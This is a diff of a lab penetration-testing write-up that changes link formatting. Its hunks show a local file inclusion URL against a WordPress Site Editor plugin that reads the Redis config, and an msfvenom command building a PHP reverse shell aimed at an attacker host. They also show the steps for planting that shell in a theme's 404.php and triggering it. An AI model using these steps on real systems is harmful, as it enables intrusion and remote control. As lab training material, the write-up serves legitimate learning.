@@ -47,7 +47,8 @@ I google for any exploit and I find a possible LFI https://www.exploit-db.com/ex
 
 As redis is running, I try to read redis configuration file, under /etc/redis https://stackoverflow.com/questions/32284494/where-is-the-data-directory-in-redis.
 
-[http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/redis/redis.conf](http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/redis/redis.conf)
+`[http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/redis/redis.conf ](http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/redis/redis.conf )`
+
 
 I find a possible username for Redis service
 
@@ -102,7 +103,7 @@ Edit 404.php file and copy [pentestmonkey's reverse shell](https://github.com/pe
 
 msfvenom -p php/reverse_php LHOST=192.168.45.159 LPORT=88 -f raw > reverse.php
 
-Then trigger the exploit by visiting [http[:]//192.168.223.166/wp-content/themes/twentytwenty/404](http[:]//192.168.223.166/wp-content/themes/twentytwenty/404.php)
+Then trigger the exploit by visiting `[http[:]//192.168.223.166/wp-content/themes/twentytwenty/404.php](http[:]//192.168.223.166/wp-content/themes/twentytwenty/404.php)`
 
 # Privilege Escalation
 
